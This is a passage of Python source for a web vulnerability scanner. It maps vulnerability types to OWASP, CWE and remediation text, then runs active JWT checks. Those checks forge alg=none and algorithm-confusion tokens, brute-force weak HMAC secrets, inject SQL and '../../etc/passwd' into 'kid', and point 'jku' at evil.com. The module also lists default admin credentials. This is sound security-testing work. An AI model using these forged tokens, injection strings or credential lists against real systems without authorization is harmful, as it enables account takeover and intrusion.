"""
VulnerabilityScanner — main DAST engine orchestrator.

Stitches together: PassiveScanner + Fuzzer + specialized active checks.
Emits normalized ScanFinding objects with OWASP category, CWE, remediation,
and chain annotations.

Checks performed:
  1. Passive phase   — headers, cookies, CORS, info disclosure (no payloads)
  2. Active fuzz     — context-aware payload fuzzing via Fuzzer
  3. JWT             — alg=none, weak HMAC, kid injection
  4. CORS active     — origin reflection, null origin, prefix/suffix bypass
  5. Prototype poll  — __proto__ / constructor.prototype injection
  6. Exceptional     — null bytes, huge inputs, type confusion
  7. GraphQL         — introspection, depth bomb, batch abuse
  8. HTTP smuggling  — CL.TE / TE.CL desync probes
  9. Rate limiting   — auth endpoint flood check
  10. Supply chain   — JS library CVE version check
  11. Default creds  — common admin credential pairs
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Optional
from urllib.parse import urlparse, urljoin

import requests
import requests.exceptions
import urllib3

urllib3.disable_warnings()

from .passive import PassiveScanner
from .fuzzer import Fuzzer, FuzzResult, PAYLOADS
from .scope import ScopeManager
from .evidence import EvidenceStore, evidence_store as _global_store
from .graphql import GraphQLScanner
from .websocket import WebSocketScanner


# ══════════════════════════════════════════════════════════════════════════════
# OWASP / CWE MAPPINGS
# ══════════════════════════════════════════════════════════════════════════════

_OWASP: dict[str, str] = {
    "sqli_error":            "A03:2025 Injection",
    "sqli_blind_time":       "A03:2025 Injection",
    "xss_reflected":         "A03:2025 Injection",
    "lfi":                   "A01:2025 Broken Access Control",
    "cmdi":                  "A03:2025 Injection",
    "ssti":                  "A03:2025 Injection",
    "ssrf":                  "A10:2025 Server-Side Request Forgery",
    "open_redirect":         "A01:2025 Broken Access Control",
    "xxe":                   "A03:2025 Injection",
    "header_injection":      "A03:2025 Injection",
    "crlf_injection":        "A03:2025 Injection",
    "prototype_pollution":   "A03:2025 Injection",
    "exceptional_conditions":"A10:2025 Exceptional Conditions",
    "cors_critical":         "A05:2025 Security Misconfiguration",
    "cors_medium":           "A05:2025 Security Misconfiguration",
    "missing_hsts":          "A02:2025 Cryptographic Failures",
    "missing_csp":           "A05:2025 Security Misconfiguration",
    "missing_httponly":      "A05:2025 Security Misconfiguration",
    "info_disclosure":       "A05:2025 Security Misconfiguration",
    "cors_preflight":        "A05:2025 Security Misconfiguration",
    "cors_cache_poison":     "A05:2025 Security Misconfiguration",
    "jwt_alg_none":          "A07:2025 Identification and Authentication Failures",
    "jwt_weak_secret":       "A07:2025 Identification and Authentication Failures",
    "jwt_kid_injection":     "A07:2025 Identification and Authentication Failures",
    "jwt_alg_confusion":     "A07:2025 Identification and Authentication Failures",
    "jwt_jku_injection":     "A07:2025 Identification and Authentication Failures",
    "jwt_sig_strip":         "A07:2025 Identification and Authentication Failures",
    "jwt_expired_accept":    "A07:2025 Identification and Authentication Failures",
    "jwt_claim_tamper":      "A07:2025 Identification and Authentication Failures",
    "graphql_introspection":      "A05:2025 Security Misconfiguration",
    "graphql_depth_bomb":         "A05:2025 Security Misconfiguration",
    "graphql_batch_abuse":        "A05:2025 Security Misconfiguration",
    "graphql_alias_dos":          "A05:2025 Security Misconfiguration",
    "graphql_directive_overload": "A05:2025 Security Misconfiguration",
    "graphql_fragment_abuse":     "A05:2025 Security Misconfiguration",
    "graphql_type_enumeration":   "A05:2025 Security Misconfiguration",
    "graphql_field_suggestion":   "A05:2025 Security Misconfiguration",
    "graphql_sqli":               "A03:2025 Injection",
    "graphql_nosqli":             "A03:2025 Injection",
    "graphql_csrf":               "A01:2025 Broken Access Control",
    "graphql_info_disclosure":    "A05:2025 Security Misconfiguration",
    "graphql_get_query":          "A05:2025 Security Misconfiguration",
    "ws_cswsh":                   "A01:2025 Broken Access Control",
    "ws_auth_bypass":             "A07:2025 Identification and Authentication Failures",
    "ws_sqli":                    "A03:2025 Injection",
    "ws_nosqli":                  "A03:2025 Injection",
    "ws_xss":                     "A03:2025 Injection",
    "ws_no_rate_limit":           "A05:2025 Security Misconfiguration",
    "ws_large_frame":             "A05:2025 Security Misconfiguration",
    "ws_info_disclosure":         "A05:2025 Security Misconfiguration",
    "ws_insecure_transport":      "A02:2025 Cryptographic Failures",
    "ws_cmdi":                    "A03:2025 Injection",
    "http_smuggling":             "A05:2025 Security Misconfiguration",
    "missing_rate_limit":    "A07:2025 Identification and Authentication Failures",
    "supply_chain":          "A06:2025 Vulnerable and Outdated Components",
    "default_creds":         "A07:2025 Identification and Authentication Failures",
}

_CWE: dict[str, str] = {
    "sqli_error":            "CWE-89",
    "sqli_blind_time":       "CWE-89",
    "xss_reflected":         "CWE-79",
    "lfi":                   "CWE-22",
    "cmdi":                  "CWE-78",
    "ssti":                  "CWE-94",
    "ssrf":                  "CWE-918",
    "open_redirect":         "CWE-601",
    "xxe":                   "CWE-611",
    "header_injection":      "CWE-113",
    "crlf_injection":        "CWE-93",
    "prototype_pollution":   "CWE-1321",
    "exceptional_conditions":"CWE-754",
    "cors_critical":         "CWE-942",
    "cors_medium":           "CWE-942",
    "missing_hsts":          "CWE-319",
    "missing_csp":           "CWE-693",
    "missing_httponly":      "CWE-1004",
    "info_disclosure":       "CWE-200",
    "cors_preflight":        "CWE-942",
    "cors_cache_poison":     "CWE-525",
    "jwt_alg_none":          "CWE-347",
    "jwt_weak_secret":       "CWE-330",
    "jwt_kid_injection":     "CWE-20",
    "jwt_alg_confusion":     "CWE-347",
    "jwt_jku_injection":     "CWE-20",
    "jwt_sig_strip":         "CWE-347",
    "jwt_expired_accept":    "CWE-613",
    "jwt_claim_tamper":      "CWE-285",
    "graphql_introspection":      "CWE-200",
    "graphql_depth_bomb":         "CWE-400",
    "graphql_batch_abuse":        "CWE-400",
    "graphql_alias_dos":          "CWE-400",
    "graphql_directive_overload": "CWE-400",
    "graphql_fragment_abuse":     "CWE-400",
    "graphql_type_enumeration":   "CWE-200",
    "graphql_field_suggestion":   "CWE-200",
    "graphql_sqli":               "CWE-89",
    "graphql_nosqli":             "CWE-943",
    "graphql_csrf":               "CWE-352",
    "graphql_info_disclosure":    "CWE-200",
    "graphql_get_query":          "CWE-16",
    "ws_cswsh":                   "CWE-346",
    "ws_auth_bypass":             "CWE-287",
    "ws_sqli":                    "CWE-89",
    "ws_nosqli":                  "CWE-943",
    "ws_xss":                     "CWE-79",
    "ws_no_rate_limit":           "CWE-770",
    "ws_large_frame":             "CWE-400",
    "ws_info_disclosure":         "CWE-200",
    "ws_insecure_transport":      "CWE-319",
    "ws_cmdi":                    "CWE-78",
    "http_smuggling":             "CWE-444",
    "missing_rate_limit":    "CWE-307",
    "supply_chain":          "CWE-1395",
    "default_creds":         "CWE-798",
}

_REMEDIATION: dict[str, str] = {
    "sqli_error":            "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
    "sqli_blind_time":       "Use parameterized queries. Apply input validation. Use WAF as defense-in-depth.",
    "xss_reflected":         "HTML-encode all user-controlled output. Implement Content-Security-Policy.",
    "lfi":                   "Validate file paths against an allowlist. Never pass user input directly to file functions.",
    "cmdi":                  "Never pass user input to shell commands. Use subprocess with list args, no shell=True.",
    "ssti":                  "Sandbox template rendering. Use safe template engines. Validate/sanitize template inputs.",
    "ssrf":                  "Validate and allowlist URLs. Block requests to 169.254.0.0/16 and RFC-1918 ranges.",
    "open_redirect":         "Validate redirect targets against an allowlist. Use relative paths for redirects.",
    "xxe":                   "Disable external entity processing in XML parsers. Use safe parser configurations.",
    "header_injection":      "Validate and sanitize header values. Reject input containing CR/LF characters.",
    "crlf_injection":        "Reject or encode CR (\\r) and LF (\\n) characters in header values.",
    "prototype_pollution":   "Use Object.create(null) for data objects. Validate JSON keys against allowlist.",
    "exceptional_conditions":"Implement robust input validation. Handle edge cases explicitly. Never expose error details.",
    "cors_critical":         "Set Access-Control-Allow-Origin to specific trusted origins. Never reflect arbitrary origins with credentials=true.",
    "cors_medium":           "Restrict CORS to specific trusted origins. Remove wildcard (*) for authenticated APIs.",
    "missing_hsts":          "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    "missing_csp":           "Implement Content-Security-Policy: default-src 'self'. Avoid 'unsafe-inline'.",
    "missing_httponly":      "Add HttpOnly flag to all session and authentication cookies.",
    "info_disclosure":       "Remove version headers. Disable debug mode. Suppress stack traces in production.",
    "cors_preflight":        "Restrict pre-flight responses. Don't allow arbitrary request headers or methods via CORS.",
    "cors_cache_poison":     "Include 'Vary: Origin' header when CORS responses depend on Origin. Prevents cache poisoning.",
    "jwt_alg_none":          "Validate JWT algorithm header. Reject 'none' algorithm. Pin expected algorithm server-side.",
    "jwt_weak_secret":       "Use cryptographically random secret of 256+ bits. Rotate secrets regularly.",
    "jwt_kid_injection":     "Validate the 'kid' header against an allowlist. Never pass kid to shell or SQL.",
    "jwt_alg_confusion":     "Pin the expected algorithm server-side. Never allow the token to dictate algorithm. Use asymmetric verification.",
    "jwt_jku_injection":     "Ignore jku/x5u/jwk headers in untrusted tokens. Pin key source to server config.",
    "jwt_sig_strip":         "Always verify JWT signature. Reject tokens with empty or missing signature.",
    "jwt_expired_accept":    "Validate exp claim server-side. Reject expired tokens with appropriate clock skew.",
    "jwt_claim_tamper":      "Validate all security-relevant claims server-side. Don't trust client-supplied role/admin claims.",
    "graphql_introspection":      "Disable GraphQL introspection in production. Use query depth/complexity limits.",
    "graphql_depth_bomb":         "Implement query depth limiting (max depth 7). Use query complexity analysis.",
    "graphql_batch_abuse":        "Disable batch queries or limit to max 5 per request. Add rate limiting per query.",
    "graphql_alias_dos":          "Limit the number of aliases per query (max 10-20). Use query complexity analysis.",
    "graphql_directive_overload": "Limit directive count per query. Validate directive usage at the gateway.",
    "graphql_fragment_abuse":     "Reject circular fragments. Limit fragment depth to 5 levels.",
    "graphql_type_enumeration":   "Disable __type queries in production alongside introspection.",
    "graphql_field_suggestion":   "Disable field suggestion in production to prevent schema enumeration.",
    "graphql_sqli":               "Use parameterized resolvers. Never concatenate user input into SQL within GraphQL resolvers.",
    "graphql_nosqli":             "Validate and sanitize all GraphQL arguments. Use ODM/ORM with parameterized queries.",
    "graphql_csrf":               "Reject mutations via GET. Require POST for all state-changing operations. Add CSRF tokens.",
    "graphql_info_disclosure":    "Mask error details in production. Return generic error messages without stack traces.",
    "graphql_get_query":          "Disable GET-based query execution or restrict to persisted queries only.",
    "ws_cswsh":                   "Validate WebSocket Origin header against allowlist. Reject connections from untrusted origins.",
    "ws_auth_bypass":             "Require authentication token in WebSocket handshake. Validate session on every connection.",
    "ws_sqli":                    "Use parameterized queries in WebSocket message handlers. Never concatenate frame data into SQL.",
    "ws_nosqli":                  "Validate and sanitize all WebSocket message fields. Use ODM/ORM with parameterized queries.",
    "ws_xss":                     "HTML-encode all WebSocket message data before rendering. Implement Content-Security-Policy.",
    "ws_no_rate_limit":           "Implement per-connection message rate limiting. Disconnect clients exceeding thresholds.",
    "ws_large_frame":             "Set maximum WebSocket frame size (e.g., 64KB). Reject oversized payloads at the gateway.",
    "ws_info_disclosure":         "Return generic error messages for malformed frames. Suppress stack traces in production.",
    "ws_insecure_transport":      "Use wss:// (WebSocket Secure) for all connections. Disable ws:// in production.",
    "ws_cmdi":                    "Never pass WebSocket message data to shell commands. Use subprocess with list args.",
    "http_smuggling":             "Normalize Transfer-Encoding and Content-Length handling. Use HTTP/2 end-to-end.",
    "missing_rate_limit":    "Implement rate limiting on auth endpoints. Add lockout after 5–10 failed attempts.",
    "supply_chain":          "Update vulnerable libraries to patched versions. Use dependency scanning in CI/CD.",
    "default_creds":         "Change all default credentials immediately after deployment. Enforce strong password policy.",
}

_SEV: dict[str, str] = {
    "sqli_error":            "high",
    "sqli_blind_time":       "high",
    "xss_reflected":         "high",
    "lfi":                   "critical",
    "cmdi":                  "critical",
    "ssti":                  "high",
    "ssrf":                  "critical",
    "open_redirect":         "medium",
    "xxe":                   "critical",
    "header_injection":      "medium",
    "crlf_injection":        "medium",
    "prototype_pollution":   "high",
    "exceptional_conditions":"medium",
    "cors_critical":         "critical",
    "cors_medium":           "medium",
    "missing_hsts":          "high",
    "missing_csp":           "medium",
    "missing_httponly":      "medium",
    "info_disclosure":       "low",
    "cors_preflight":        "medium",
    "cors_cache_poison":     "medium",
    "jwt_alg_none":          "critical",
    "jwt_weak_secret":       "critical",
    "jwt_kid_injection":     "high",
    "jwt_alg_confusion":     "critical",
    "jwt_jku_injection":     "high",
    "jwt_sig_strip":         "critical",
    "jwt_expired_accept":    "medium",
    "jwt_claim_tamper":      "high",
    "graphql_introspection":      "medium",
    "graphql_depth_bomb":         "medium",
    "graphql_batch_abuse":        "medium",
    "graphql_alias_dos":          "medium",
    "graphql_directive_overload": "medium",
    "graphql_fragment_abuse":     "high",
    "graphql_type_enumeration":   "medium",
    "graphql_field_suggestion":   "low",
    "graphql_sqli":               "high",
    "graphql_nosqli":             "high",
    "graphql_csrf":               "high",
    "graphql_info_disclosure":    "medium",
    "graphql_get_query":          "low",
    "ws_cswsh":                   "high",
    "ws_auth_bypass":             "high",
    "ws_sqli":                    "high",
    "ws_nosqli":                  "high",
    "ws_xss":                     "high",
    "ws_no_rate_limit":           "medium",
    "ws_large_frame":             "medium",
    "ws_info_disclosure":         "medium",
    "ws_insecure_transport":      "high",
    "ws_cmdi":                    "critical",
    "http_smuggling":             "high",
    "missing_rate_limit":    "high",
    "supply_chain":          "medium",
    "default_creds":         "critical",
}

# Context-aware param name → payload types mapping
_PARAM_CONTEXT: dict[str, list[str]] = {
    "email":     ["header_injection"],
    "mail":      ["header_injection"],
    "redirect":  ["open_redirect", "ssrf"],
    "next":      ["open_redirect", "ssrf"],
    "url":       ["open_redirect", "ssrf"],
    "return_to": ["open_redirect", "ssrf"],
    "callback":  ["open_redirect", "ssrf"],
    "file":      ["lfi"],
    "path":      ["lfi"],
    "filename":  ["lfi"],
    "page":      ["lfi"],
    "include":   ["lfi"],
    "load":      ["lfi"],
    "template":  ["ssti"],
    "tpl":       ["ssti"],
    "render":    ["ssti"],
    "cmd":       ["cmdi"],
    "exec":      ["cmdi"],
    "command":   ["cmdi"],
    "run":       ["cmdi"],
    "q":         ["sqli_error", "sqli_blind_time", "xss_reflected"],
    "search":    ["sqli_error", "sqli_blind_time", "xss_reflected"],
    "query":     ["sqli_error", "sqli_blind_time", "xss_reflected"],
    "id":        ["sqli_error", "sqli_blind_time"],
    "xml":       ["xxe"],
    "data":      ["xxe", "ssti"],
    "body":      ["xxe"],
}


# ══════════════════════════════════════════════════════════════════════════════
# SCAN FINDING
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class ScanFinding:
    id:             str
    url:            str
    method:         str
    param:          str
    param_type:     str
    vuln_type:      str
    owasp_category: str
    cwe:            str
    finding:        str
    severity:       str
    proof:          str
    payload:        str
    evidence_id:    Optional[str]
    remediation:    str
    chain_id:       Optional[str]  = None
    chain_desc:     Optional[str]  = None
    resp_time_ms:   float          = 0.0
    status_code:    int            = 0
    ts:             str            = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

    def to_dict(self) -> dict:
        return {
            "id":             self.id,
            "url":            self.url,
            "method":         self.method,
            "param":          self.param,
            "param_type":     self.param_type,
            "vuln_type":      self.vuln_type,
            "owasp_category": self.owasp_category,
            "cwe":            self.cwe,
            "finding":        self.finding,
            "severity":       self.severity,
            "proof":          self.proof[:500] if self.proof else "",
            "payload":        self.payload,
            "evidence_id":    self.evidence_id,
            "remediation":    self.remediation,
            "chain_id":       self.chain_id,
            "chain_desc":     self.chain_desc,
            "resp_time_ms":   self.resp_time_ms,
            "status_code":    self.status_code,
            "ts":             self.ts,
        }


# ══════════════════════════════════════════════════════════════════════════════
# VULNERABILITY SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class VulnerabilityScanner:
    """
    Master DAST scanner. Orchestrates all passive + active checks.
    Call scan(sitemap) to run everything and get back a list of ScanFindings.
    """

    DEFAULT_CREDS = [
        ("admin",  "admin"),
        ("admin",  "password"),
        ("admin",  "123456"),
        ("admin",  "admin123"),
        ("admin",  ""),
        ("root",   "root"),
        ("root",   "toor"),
        ("root",   ""),
        ("test",   "test"),
        ("guest",  "guest"),
        ("user",   "user"),
        ("admin",  "letmein"),
        ("admin",  "Welcome1"),
        ("admin",  "changeme"),
    ]

    WEAK_JWT_SECRETS = [
        # Common defaults
        "secret", "password", "key", "jwt", "123456", "secret123", "supersecret",
        # Framework defaults
        "changeme", "changeit", "your-256-bit-secret", "my-secret-key",
        "default", "test", "admin", "letmein", "qwerty", "1234567890",
        # Common developer passwords
        "abc123", "iloveyou", "welcome", "monkey", "master",
        # JWT-specific common secrets
        "jwt-secret", "jwt_secret", "token-secret", "auth-secret",
        "hmac-secret", "signing-key", "private-key", "my-jwt-secret",
        # Short / trivial
        "a", "1", "pass", "test123", "hello",
    ]

    JS_CVE_PATTERNS = [
        (re.compile(r"jquery[.-v]*((?:1\.[0-9]\.|2\.[0-2]\.)\d+)", re.I),
         "jQuery {v} < 3.5.0 — CVE-2020-11022 XSS via .html()/.append()", "supply_chain"),
        (re.compile(r"bootstrap[.-v]*((?:2\.|3\.|4\.[0-2]\.)\d+)", re.I),
         "Bootstrap {v} < 4.3.1 — CVE-2019-8331 XSS via data-* attributes", "supply_chain"),
        (re.compile(r"angular(?:\.min)?\.js[^\"']*(1\.\d+\.\d+)", re.I),
         "AngularJS 1.x ({v}) — End of Life Dec 2021, multiple XSS CVEs", "supply_chain"),
        (re.compile(r"lodash[.-v]*(4\.(?:1[0-6]|[0-9])\.\d+|[0-3]\.\d+\.\d+)", re.I),
         "Lodash {v} < 4.17.21 — CVE-2021-23337 prototype pollution", "supply_chain"),
        (re.compile(r"moment[.-v]*(\d+\.\d+\.\d+)", re.I),
         "Moment.js {v} — End of Life, unmaintained; consider date-fns / Day.js", "supply_chain"),
    ]

    def __init__(
        self,
        target:     str,
        scope:      ScopeManager,
        session:    requests.Session,
        ev_store:   EvidenceStore | None = None,
        stop_event: threading.Event | None = None,
        on_finding: Callable | None = None,
        timeout:    int = 10,
        rate_limit: float = 0.05,
        oast=None,
    ):
        self.target     = target
        self.scope      = scope
        self.session    = session
        self.ev_store   = ev_store or _global_store
        self.stop_event = stop_event or threading.Event()
        self.on_finding = on_finding
        self.timeout    = timeout
        self.rate_limit = rate_limit
        self.oast       = oast
        self._lock      = threading.Lock()
        self._results:  list[ScanFinding] = []

    # ── Public ────────────────────────────────────────────────────────────────

    def scan(self, sitemap) -> list[ScanFinding]:
        """Run all scan phases and return list of ScanFindings."""
        findings: list[ScanFinding] = []

        # Phase 1: Passive
        findings += self._passive_phase(sitemap)
        if self.stop_event.is_set():
            return findings

        # Phase 2: Active fuzzing
        findings += self._active_fuzz_phase(sitemap.surfaces)
        if self.stop_event.is_set():
            return findings

        # Phase 3: Specialized checks
        findings += self._check_jwt(sitemap)
        findings += self._check_cors_active(sitemap)
        findings += self._check_prototype_pollution(sitemap.surfaces)
        findings += self._check_exceptional_conditions(sitemap.surfaces)
        findings += self._check_graphql(sitemap)
        findings += self._check_websocket(sitemap)
        findings += self._check_http_smuggling(sitemap)
        findings += self._check_rate_limiting(sitemap)
        findings += self._check_supply_chain(sitemap)
        findings += self._check_default_credentials(sitemap)

        # Phase 4: Chain analysis
        from .vuln_chainer import VulnChainer
        VulnChainer().analyze_and_annotate(findings)

        return findings

    # ── Phase 1: Passive ─────────────────────────────────────────────────────

    def _passive_phase(self, sitemap) -> list[ScanFinding]:
        scanner = PassiveScanner()
        findings = []
        for url, page in sitemap.pages.items():
            if self.stop_event.is_set():
                break
            pf_list = scanner.scan(
                url=url,
                status_code=page.get("status", 0),
                resp_headers=page.get("headers", {}),
                resp_body="",
                cookies={},
            )
            for pf in pf_list:
                vtype = self._passive_category_to_vuln_type(pf.category, pf.finding)
                sf = self._make_finding(
                    url=url, method="GET", param="", param_type="passive",
                    vuln_type=vtype,
                    finding=pf.finding,
                    severity=pf.severity.lower(),
                    proof=pf.evidence,
                    payload="",
                    evidence_id=None,
                )
                findings.append(sf)
                self._emit(sf)
        return findings

    def _passive_category_to_vuln_type(self, category: str, finding: str) -> str:
        finding_l = finding.lower()
        if "hsts" in finding_l or "strict-transport" in finding_l:
            return "missing_hsts"
        if "content-security-policy" in finding_l or "csp" in finding_l:
            return "missing_csp"
        if "httponly" in finding_l:
            return "missing_httponly"
        if "cors" in finding_l:
            return "cors_medium"
        return "info_disclosure"

    # ── Phase 2: Active fuzz ──────────────────────────────────────────────────

    def _active_fuzz_phase(self, surfaces: list) -> list[ScanFinding]:
        def _on_fuzz_result(fr: FuzzResult):
            sf = self._fuzz_result_to_scan_finding(fr)
            self._emit(sf)

        fuzzer = Fuzzer(
            scope=self.scope,
            session=self.session,
            ev_store=self.ev_store,
            timeout=self.timeout,
            rate_limit=self.rate_limit,
            on_finding=_on_fuzz_result,
            stop_event=self.stop_event,
        )

        # Inject context-aware vuln type overrides
        enriched_surfaces = self._enrich_surfaces(surfaces)
        fuzz_results = fuzzer.fuzz_all(enriched_surfaces)

        return [self._fuzz_result_to_scan_finding(fr) for fr in fuzz_results]

    def _enrich_surfaces(self, surfaces: list) -> list:
        """Tag surfaces with context-aware vuln types based on param name."""
        for s in surfaces:
            pname = (s.param or "").lower()
            for key, vtypes in _PARAM_CONTEXT.items():
                if key in pname:
                    # Attach hint — fuzzer will use PARAM_TYPE_MAP, but we tag for reference
                    if not hasattr(s, "_context_vtypes"):
                        s._context_vtypes = vtypes
                    break
        return surfaces

    def _fuzz_result_to_scan_finding(self, fr: FuzzResult) -> ScanFinding:
        return self._make_finding(
            url=fr.url, method=fr.method,
            param=fr.param, param_type=fr.param_type,
            vuln_type=fr.vuln_type,
            finding=fr.finding,
            severity=fr.severity,
            proof=fr.finding,
            payload=fr.payload,
            evidence_id=fr.evidence_id,
            resp_time_ms=fr.resp_time_ms,
            status_code=fr.status_code,
        )

    # ── JWT checks ────────────────────────────────────────────────────────────

    def _check_jwt(self, sitemap) -> list[ScanFinding]:
        findings = []
        tokens = self._collect_jwts(sitemap)
        for token, source_url in tokens:
            try:
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                header_raw = self._b64_decode_jwt(parts[0])
                payload_raw = self._b64_decode_jwt(parts[1])
                header = json.loads(header_raw)
                alg = header.get("alg", "").lower()

                # Test 1: alg=none
                none_token = self._make_alg_none_token(parts[0], parts[1])
                resp = self._req("GET", source_url, headers={"Authorization": f"Bearer {none_token}"})
                if resp and resp.status_code in (200, 201, 204):
                    findings.append(self._make_finding(
                        url=source_url, method="GET", param="Authorization",
                        param_type="header", vuln_type="jwt_alg_none",
                        finding=f"JWT alg=none bypass CONFIRMED — server accepted unsigned token [{source_url}]",
                        severity="critical",
                        proof=f"Original alg: {header.get('alg')} | Modified: none | Status: {resp.status_code}",
                        payload=none_token[:80],
                    ))

                # Test 2: Weak HMAC secret brute force
                if alg in ("hs256", "hs384", "hs512"):
                    for secret in self.WEAK_JWT_SECRETS:
                        try:
                            import hmac as _hmac, hashlib
                            msg = f"{parts[0]}.{parts[1]}".encode()
                            sig_check = base64.urlsafe_b64encode(
                                _hmac.new(secret.encode(), msg, hashlib.sha256).digest()
                            ).rstrip(b"=").decode()
                            if sig_check == parts[2]:
                                findings.append(self._make_finding(
                                    url=source_url, method="GET", param="Authorization",
                                    param_type="header", vuln_type="jwt_weak_secret",
                                    finding=f"JWT weak HMAC secret CONFIRMED — secret='{secret}' [{source_url}]",
                                    severity="critical",
                                    proof=f"Algorithm: {header.get('alg')} | Secret: {secret}",
                                    payload=token[:80],
                                ))
                                break
                        except Exception:
                            continue

                # Test 3: kid header injection
                kid = header.get("kid", "")
                if kid:
                    sqli_kid = "' OR 1=1--"
                    lfi_kid  = "../../etc/passwd"
                    for malicious_kid in (sqli_kid, lfi_kid):
                        new_header = {**header, "kid": malicious_kid}
                        encoded_hdr = base64.urlsafe_b64encode(
                            json.dumps(new_header).encode()
                        ).rstrip(b"=").decode()
                        kid_token = f"{encoded_hdr}.{parts[1]}.{parts[2]}"
                        resp2 = self._req("GET", source_url,
                                          headers={"Authorization": f"Bearer {kid_token}"})
                        if resp2 and "error" not in resp2.text.lower()[:200]:
                            findings.append(self._make_finding(
                                url=source_url, method="GET", param="Authorization:kid",
                                param_type="header", vuln_type="jwt_kid_injection",
                                finding=f"JWT kid header injection — server processed malicious kid [{source_url}]",
                                severity="high",
                                proof=f"Injected kid: {malicious_kid} | Status: {resp2.status_code}",
                                payload=malicious_kid,
                            ))
                            break

                # Test 4: Algorithm confusion (RS256 → HS256)
                # If server uses RSA, attacker can switch to HS256 and sign with public key
                if alg in ("rs256", "rs384", "rs512", "es256", "es384", "es512", "ps256"):
                    confused_header = {**header, "alg": "HS256"}
                    encoded_hdr = base64.urlsafe_b64encode(
                        json.dumps(confused_header).encode()
                    ).rstrip(b"=").decode()
                    # Sign with empty secret (detection: does server accept HS256 when expecting RSA?)
                    import hmac as _hmac
                    msg = f"{encoded_hdr}.{parts[1]}".encode()
                    fake_sig = base64.urlsafe_b64encode(
                        _hmac.new(b"", msg, hashlib.sha256).digest()
                    ).rstrip(b"=").decode()
                    confused_token = f"{encoded_hdr}.{parts[1]}.{fake_sig}"
                    resp3 = self._req("GET", source_url,
                                      headers={"Authorization": f"Bearer {confused_token}"})
                    if resp3 and resp3.status_code in (200, 201, 204):
                        findings.append(self._make_finding(
                            url=source_url, method="GET", param="Authorization:alg",
                            param_type="header", vuln_type="jwt_alg_confusion",
                            finding=f"JWT algorithm confusion — server accepted HS256 token (expected {header.get('alg')}) [{source_url}]",
                            severity="critical",
                            proof=f"Original alg: {header.get('alg')} | Confused to: HS256 | Status: {resp3.status_code}",
                            payload="alg:HS256 confusion",
                        ))

                # Test 5: Signature stripping (send header.payload. with empty sig)
                stripped_token = f"{parts[0]}.{parts[1]}."
                resp4 = self._req("GET", source_url,
                                  headers={"Authorization": f"Bearer {stripped_token}"})
                if resp4 and resp4.status_code in (200, 201, 204):
                    findings.append(self._make_finding(
                        url=source_url, method="GET", param="Authorization",
                        param_type="header", vuln_type="jwt_sig_strip",
                        finding=f"JWT signature stripping — server accepted token without signature [{source_url}]",
                        severity="critical",
                        proof=f"Token: header.payload. (empty signature) | Status: {resp4.status_code}",
                        payload="Empty signature",
                    ))

                # Test 6: jku header injection (set jku to attacker URL)
                if self.oast:
                    oast_url = f"http://{self.oast.domain}/jwt-jku"
                    jku_header = {**header, "jku": oast_url}
                    encoded_jku = base64.urlsafe_b64encode(
                        json.dumps(jku_header).encode()
                    ).rstrip(b"=").decode()
                    jku_token = f"{encoded_jku}.{parts[1]}.{parts[2]}"
                    self._req("GET", source_url,
                              headers={"Authorization": f"Bearer {jku_token}"})
                    # Detection happens via OAST callback — if server fetches jku URL
                else:
                    # Without OAST, just test if server processes jku without error
                    jku_header = {**header, "jku": "https://evil.com/.well-known/jwks.json"}
                    encoded_jku = base64.urlsafe_b64encode(
                        json.dumps(jku_header).encode()
                    ).rstrip(b"=").decode()
                    jku_token = f"{encoded_jku}.{parts[1]}.{parts[2]}"
                    resp5 = self._req("GET", source_url,
                                      headers={"Authorization": f"Bearer {jku_token}"})
                    if resp5 and resp5.status_code in (200, 201, 204):
                        findings.append(self._make_finding(
                            url=source_url, method="GET", param="Authorization:jku",
                            param_type="header", vuln_type="jwt_jku_injection",
                            finding=f"JWT jku injection — server accepted token with attacker-controlled jku [{source_url}]",
                            severity="high",
                            proof=f"Injected jku: https://evil.com/.well-known/jwks.json | Status: {resp5.status_code}",
                            payload="jku:evil.com",
                        ))

                # Test 7: jwk header embedding (embed custom key in JWT header)
                jwk_header = {**header, "jwk": {
                    "kty": "oct", "k": base64.urlsafe_b64encode(b"attacker-key").rstrip(b"=").decode(),
                }}
                encoded_jwk = base64.urlsafe_b64encode(
                    json.dumps(jwk_header).encode()
                ).rstrip(b"=").decode()
                import hmac as _hmac2
                msg_jwk = f"{encoded_jwk}.{parts[1]}".encode()
                sig_jwk = base64.urlsafe_b64encode(
                    _hmac2.new(b"attacker-key", msg_jwk, hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                jwk_token = f"{encoded_jwk}.{parts[1]}.{sig_jwk}"
                resp6 = self._req("GET", source_url,
                                  headers={"Authorization": f"Bearer {jwk_token}"})
                if resp6 and resp6.status_code in (200, 201, 204):
                    findings.append(self._make_finding(
                        url=source_url, method="GET", param="Authorization:jwk",
                        param_type="header", vuln_type="jwt_jku_injection",
                        finding=f"JWT jwk embedding — server accepted token with embedded attacker key [{source_url}]",
                        severity="critical",
                        proof=f"Embedded jwk with attacker key | Status: {resp6.status_code}",
                        payload="jwk:embedded-key",
                    ))

                # Test 8: Expired token replay
                try:
                    payload_obj = json.loads(payload_raw)
                    exp = payload_obj.get("exp")
                    if exp and isinstance(exp, (int, float)) and exp < time.time():
                        # Token is already expired — just replay it
                        resp7 = self._req("GET", source_url,
                                          headers={"Authorization": f"Bearer {token}"})
                        if resp7 and resp7.status_code in (200, 201, 204):
                            findings.append(self._make_finding(
                                url=source_url, method="GET", param="Authorization",
                                param_type="header", vuln_type="jwt_expired_accept",
                                finding=f"JWT expired token accepted — exp={exp} is in the past [{source_url}]",
                                severity="medium",
                                proof=f"exp: {exp} | Current time: {int(time.time())} | Status: {resp7.status_code}",
                                payload=f"Expired JWT (exp={exp})",
                            ))
                except Exception:
                    pass

                # Test 9: Claim tampering (escalate role/admin)
                try:
                    payload_obj = json.loads(payload_raw)
                    tampered = False
                    for claim, value in [("admin", True), ("role", "admin"),
                                          ("is_admin", True), ("scope", "admin"),
                                          ("permissions", ["*"])]:
                        if claim in payload_obj and payload_obj[claim] != value:
                            payload_obj[claim] = value
                            tampered = True
                    if tampered:
                        new_payload = base64.urlsafe_b64encode(
